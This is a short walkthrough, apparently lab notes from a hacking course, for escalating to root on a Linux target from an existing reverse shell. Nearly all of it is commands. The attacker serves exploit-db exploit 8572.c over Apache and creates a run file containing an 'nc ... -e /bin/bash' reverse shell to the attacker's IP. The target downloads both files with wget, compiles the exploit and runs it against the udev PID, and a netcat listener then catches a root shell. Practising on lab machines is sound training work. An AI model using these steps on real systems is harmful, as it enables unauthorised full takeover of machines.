# Hacking II - Privilege Escalation 

## Prerequisites 

  * You need to have a reverse shell open (e.g. Hacking I - Session) 

## Walkthrough 

```
# STEP 1: Reverse shell (connected to target)
# In Reverse shell find out the kernel version 
uname -a
lsb_release -a

# STEP 2: On kali 
# Open 2nd kali terminal and search exploits 
searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6

# find out source code c
less /usr/share/exploitdb/exploits/linux/local/8572.c

# Start apache server 
systemctl start apache2 

# Symbolic link to all the exploits 
ln -s /usr/share/exploitdb/exploits/linux/local/ /var/www/html/

# Create a run file we will need later 
vi /var/www/html/run
# ip will be the ip of our kali-server 
#!/bin/bash
nc 192.168.10.169 12345 -e /bin/bash

# STEP 3: Reverse shell (connected to target) 
# Download the files 
cd /tmp
wget http://192.168.10.169/run
wget http://192.168.10.169/local/8572.c
# compiling exploit in reverse shell
gcc -o exploit 8572.c
ls -l

# Finding the pid 
cat /proc/net/netlink
ps aux | grep udev

# STEP 4:
# on Kali start a listener 
nc -lvp 12345

# STEP 5:
# Back on reverse shell start the exploit 
# with the pid you got e.g. 2748 (that from cat /proc/net/netlink)  
./exploit 2748

# STEP 6:
# Go back to kali and in your listener enter 
whoami
```


## Ref: (root privileges)

  * https://samsclass.info/124/proj14/p18xLPE.htm
  
